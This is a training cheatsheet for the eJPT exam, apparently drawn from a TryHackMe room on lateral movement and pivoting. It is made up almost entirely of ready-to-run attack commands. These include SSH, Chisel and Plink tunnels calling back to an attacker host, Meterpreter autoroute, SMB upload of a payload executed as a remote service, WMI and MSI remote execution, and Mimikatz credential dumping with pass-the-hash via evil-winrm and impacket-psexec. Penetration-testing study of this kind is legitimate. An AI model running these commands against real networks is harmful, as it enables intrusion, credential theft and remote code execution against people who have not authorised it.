# Lateral Movement & Pivoting – eJPT / PT1 Cheatsheet
> Based on TryHackMe "Lateral Movement and Pivoting" room  
> ⚠️ No flags or direct answers — methodology, tools, and commands only.

---

## 1. Objectives & Scenarios

This room covers how attackers move **deeper into a network** after gaining an initial foothold. The core scenarios you'll encounter:

| Scenario | What It Means |
|----------|--------------|
| **Accessing Internal Networks** | Your initial foothold is on a DMZ/perimeter host. The real targets are on internal subnets you can't reach directly. |
| **Using a Jump Host as a Proxy** | A compromised machine with dual NICs becomes your tunnel to a hidden subnet. |
| **Remote Execution via Windows Protocols** | Using WinRM, WMI, SMB, or SC to execute payloads on other hosts without touching them directly. |
| **Pass-the-Hash / Token Reuse** | Using captured credentials or hashes to authenticate to other hosts. |
| **Double Pivoting** | Pivoting through Machine A → Machine B → Machine C across multiple subnets. |

---

## 2. Workflow & Methodology

### Phase 1 — Foothold Established, Now What?

```
[Attacker] ──── (direct access) ──── [Pivot Host] ──── (hidden network) ──── [Target]
```

### Step 1: Enumerate the Pivot Host's Network Interfaces
```bash
# Linux pivot host
ip a
ip route
arp -a
cat /etc/hosts

# Windows pivot host
ipconfig /all
route print
arp -a
```
**Goal:** Find dual-NIC hosts connected to subnets you can't reach.

---

### Step 2: Identify Target Networks

```bash
# Ping sweep (Linux)
for i in $(seq 1 254); do ping -c1 -W1 192.168.X.$i & done | grep "bytes from"

# Windows ping sweep
for /L %i in (1,1,254) do ping -n 1 192.168.X.%i | find "Reply"

# Via Nmap (if installed on pivot)
nmap -sn 10.10.10.0/24
```

---

### Step 3: Choose a Tunneling Method

| Situation | Best Tool |
|-----------|-----------|
| SSH access to pivot | SSH Dynamic Forwarding + ProxyChains |
| No SSH, but HTTP out | Chisel |
| Windows pivot with SSH client | Plink.exe |
| Need full VPN-like access | SSHuttle |
| Meterpreter session | `autoroute` + `socks_proxy` |

---

### Step 4: Establish the Tunnel

_(See Section 3 for full commands)_

---

### Step 5: Configure ProxyChains

```bash
sudo nano /etc/proxychains4.conf
# Comment out: strict_chain
# Uncomment: dynamic_chain
# At bottom [ProxyList]:
socks5  127.0.0.1  1080
```

---

### Step 6: Scan & Exploit Through the Tunnel

```bash
# Nmap through proxy — MUST use -sT -Pn (no raw sockets through SOCKS)
proxychains nmap -sT -Pn -sV -p 22,80,443,445,3389,5985 10.10.10.5

# Run any tool through proxy
proxychains curl http://10.10.10.5
proxychains python3 exploit.py
proxychains xfreerdp /v:10.10.10.5 /u:Administrator
```

---

### Step 7: Lateral Movement Execution

Once you can reach the next target, pivot into it using one of the Windows lateral movement techniques (Section 4).

---

## 3. Command & Tool Cheatsheet

### 🔧 SSH Tunneling

| Technique | Command | What It Does | eJPT Relevance |
|-----------|---------|-------------|----------------|
| **Local Port Forward** | `ssh -L 8080:TARGET_IP:80 user@PIVOT_IP -N` | Opens local port 8080, traffic goes to TARGET:80 via pivot | Expose a single internal port |
| **Remote Port Forward** | `ssh -R 9001:127.0.0.1:4444 user@ATTACKER_IP -N` | Pivot connects back; forwards its port to attacker | Catch reverse shells through firewall |
| **Dynamic SOCKS Proxy** | `ssh -D 1080 user@PIVOT_IP -N` | Opens SOCKS proxy on port 1080; route all traffic via pivot | Scan entire hidden subnet |
| **Jump Host (multi-hop)** | `ssh -J user@PIVOT_IP -D 9050 user@DEEP_HOST` | SSH hop through pivot to reach deeper host | Double pivot |

```bash
# Most useful for eJPT — Dynamic forwarding to scan full subnet
ssh -D 1080 user@PIVOT_IP -N -f
# -N = no command, -f = background
```

---

### 🔧 Chisel (No SSH Required)

Chisel works even when SSH isn't available. It tunnels TCP over HTTP. **You need the chisel binary on both machines.**

```bash
# --- ATTACKER MACHINE ---
# Start server waiting for reverse connections
./chisel server -p 9999 --reverse

# --- PIVOT HOST (compromised machine) ---
# Connect back and open SOCKS proxy on attacker port 1080
./chisel client ATTACKER_IP:9999 R:socks

# --- ATTACKER MACHINE (ProxyChains config) ---
# /etc/proxychains4.conf → socks5 127.0.0.1 1080
proxychains nmap -sT -Pn 10.10.10.0/24
```

```bash
# Forward a specific port (not full SOCKS)
# On pivot: connect back and forward TARGET:3389 to attacker:13389
./chisel client ATTACKER_IP:9999 R:13389:TARGET_IP:3389
# Now on attacker: xfreerdp /v:127.0.0.1:13389

# Forward SOCKS proxy FROM pivot (push model)
# On pivot:
./chisel server -p 8080 --socks5
# On attacker:
./chisel client PIVOT_IP:8080 1080:socks
```

---

### 🔧 Plink.exe (Windows Pivot, No SSH Client)

Use when the pivot is a Windows machine that doesn't have OpenSSH.

```cmd
# On Windows pivot — remote port forward (reverse tunnel)
plink.exe -l root -R 9050:127.0.0.1:9050 ATTACKER_IP

# Local port forward
plink.exe -l user -L 8080:TARGET_IP:80 ATTACKER_IP

# Accept host key without prompt (important for scripts)
echo y | plink.exe -l root -R 9050:127.0.0.1:9050 ATTACKER_IP
```

---

### 🔧 SSHuttle (Transparent VPN-like)

Requires Python on the pivot and root on attacker. Traffic routes transparently — no ProxyChains needed.

```bash
# Route all traffic to 10.10.10.0/24 through pivot
sshuttle -r user@PIVOT_IP 10.10.10.0/24

# Exclude the pivot from the tunnel (important)
sshuttle -r user@PIVOT_IP 10.10.10.0/24 -x PIVOT_IP

# Specify SSH key
sshuttle -r user@PIVOT_IP --ssh-cmd 'ssh -i id_rsa' 10.10.10.0/24
```
> ⚠️ Nmap does NOT work with sshuttle. Use for web, RDP, SMB, etc.

---

### 🔧 Metasploit (Meterpreter Pivoting)

```bash
# After getting Meterpreter session
meterpreter > run post/multi/manage/autoroute SUBNET=10.10.10.0/24

# Or manually
meterpreter > run autoroute -s 10.10.10.0/24
meterpreter > background

# Start SOCKS proxy
msf > use auxiliary/server/socks_proxy
msf > set SRVPORT 1080
msf > set VERSION 5
msf > run -j

# Use ProxyChains with the above
proxychains nmap -sT -Pn 10.10.10.5
```

---

### 🔧 ProxyChains Configuration

```bash
# /etc/proxychains4.conf
dynamic_chain          # Use this — skips dead proxies
# strict_chain         # Comment this out

# Reduce timeout for speed
tcp_read_time_out 800
tcp_connect_time_out 800

[ProxyList]
socks4  127.0.0.1  1080   # For SSH / socks4 tunnels
# socks5  127.0.0.1  1080  # For Chisel / Meterpreter socks5
```

```bash
# Nmap via proxychains — required flags
proxychains nmap -sT -Pn -p 80,443,22,445,3389 TARGET_IP

# Quiet mode (suppress proxychains output)
proxychains -q nmap -sT -Pn TARGET_IP
```

---

## 4. Windows Lateral Movement Techniques

### WinRM (PowerShell Remoting)

```powershell
# Port: TCP/5985 (HTTP) or TCP/5986 (HTTPS)

# Using winrs.exe
winrs.exe -u:DOMAIN\user -p:password -r:TARGET_HOST cmd

# Using Evil-WinRM (attacker box)
evil-winrm -i TARGET_IP -u Administrator -p 'password'

# Using PowerShell
$sess = New-PSSession -ComputerName TARGET_HOST -Credential (Get-Credential)
Invoke-Command -Session $sess -ScriptBlock { whoami }
```

---

### SMB + Service Creation (sc.exe)

```bash
# Step 1: Upload payload via SMB
smbclient //TARGET_IP/ADMIN$ -U 'DOMAIN\user%password' -c 'put payload.exe'

# Step 2: Create and start the service remotely
sc.exe \\TARGET_HOST create MySvc binPath= "%windir%\payload.exe" start= auto
sc.exe \\TARGET_HOST start MySvc
```

---

### WMI

```powershell
# Create CIM session (DCOM protocol)
$username = 'user'; $password = 'pass'
$secpass = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object PSCredential($username, $secpass)
$opt = New-CimSessionOption -Protocol DCOM
$session = New-CimSession -ComputerName TARGET_HOST -Credential $cred -SessionOption $opt

# Execute command via WMI
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="cmd.exe /c whoami > C:\output.txt"}
```

---

### MSI via WMI (AlwaysInstallElevated / remote install)

```powershell
# Upload .msi payload via SMB first, then install remotely
Invoke-CimMethod -CimSession $session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation="C:\Windows\payload.msi"; Options=""; AllUsers=$false}
```

---

### Pass-the-Hash (PtH)

```bash
# Dump NTLM hashes (on compromised host)
# Using Mimikatz:
sekurlsa::logonpasswords
# or
lsadump::sam

# Use hash to authenticate (no plaintext needed)
evil-winrm -i TARGET_IP -u Administrator -H NTLM_HASH
pth-winexe -U DOMAIN/user%HASH //TARGET_IP cmd
proxychains impacket-psexec DOMAIN/user@TARGET_IP -hashes :NTLM_HASH
```

---

### SOCAT Port Forwarding (on pivot host)

```bash
# Forward TCP/1337 on pivot to TARGET_IP:3389
socat TCP4-LISTEN:1337,fork TCP4:TARGET_IP:3389

# Now connect to pivot:1337 to reach target:3389
xfreerdp /v:PIVOT_IP:1337 /u:Administrator
```

---

## 5. eJPT Exam Mapping

### What to Expect

- **1–2 pivoting scenarios** where a hidden subnet requires tunneling
- You'll find a machine with **two IP addresses** — that's your pivot point
- Common exam flow:

```
Scan → Find service on exposed host → Exploit → Get shell →
Enumerate interfaces → Find hidden subnet → Set up tunnel →
Scan internal subnet → Exploit internal target → Get flag
```

### Quick Identification Checklist

```bash
# Found a pivot machine? Run:
ip a                    # Look for two IPs / two interfaces
ip route                # Look for routes to internal subnets
arp -a                  # Check known hosts on other subnets
cat /etc/hosts          # Hostnames of internal machines
ss -tnlp / netstat -tnlp  # Services listening internally
```

### Exam Time Strategy

| Phase | Time Budget |
|-------|-------------|
| Identify dual-NIC host | 3–5 min |
| Set up tunnel (SSH or Chisel) | 5 min |
| Scan hidden subnet | 5–10 min |
| Exploit internal target | 10–15 min |

### Tools Priority for eJPT

1. **SSH Dynamic Forwarding** — try first if SSH is available
2. **Chisel** — fallback if no SSH on pivot
3. **Metasploit autoroute** — great if you already have Meterpreter
4. **SSHuttle** — easy but Nmap won't work through it

---

## 6. Common Pitfalls & Fixes

| Pitfall | Symptom | Fix |
|---------|---------|-----|
| Nmap not working through proxy | Scan hangs or returns no results | Always use `-sT -Pn` with proxychains |
| Wrong SOCKS version in proxychains.conf | Connection refused errors | Match version: Chisel = `socks5`, SSH = `socks4` or `socks5` |
| Tunnel drops silently | Shell dies mid-scan | Run tunnel in background with `-f -N` or use `tmux` |
| DNS not resolving internal hosts | Can't reach internal hostnames | Add entries to `/etc/hosts` manually |
| ProxyChains leaking real IP | DNS leaks | Uncomment `proxy_dns` in proxychains.conf |
| Service won't start on remote host | `sc start` fails | Check payload architecture (x86 vs x64) with `wmic os get osarchitecture` |
| Firewall blocking reverse shell | Listener never receives connection | Try common allowed ports: 80, 443, 8080 |
| Forgot to `background` Meterpreter | autoroute not working | `Ctrl+Z` to background, then set up route |
| ProxyChains timeout too high | Nmap takes forever | Set `tcp_connect_time_out 800` in proxychains.conf |
| Plink.exe prompts for host key | Script hangs | Prepend `echo y |` before plink command |

---

## 7. Quick Reference — Full Attack Chain

```
# 1. Get initial shell
nmap -sV TARGET → exploit service → reverse shell

# 2. Enumerate pivot opportunities  
ip a && arp -a && ip route

# 3. Setup SSH tunnel (if SSH available)
ssh -D 1080 user@PIVOT_IP -N -f

# 4. Or setup Chisel (if no SSH)
# Attacker: ./chisel server -p 9999 --reverse
# Pivot:    ./chisel client ATTACKER_IP:9999 R:socks

# 5. Configure ProxyChains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# 6. Scan internal subnet
proxychains nmap -sT -Pn -sV -p 22,80,445,3389,5985 10.10.10.0/24

# 7. Exploit internal target
proxychains python3 exploit.py 10.10.10.5
# or
evil-winrm -i 10.10.10.5 -u admin -p password  # (via proxychains)

# 8. Get proof
whoami && hostname && ipconfig /all
```

---

> 💡 **Golden Rule:** Always verify your tunnel works before running exploits.  
> Test with: `proxychains curl http://INTERNAL_IP` or `proxychains nc -zv INTERNAL_IP PORT`
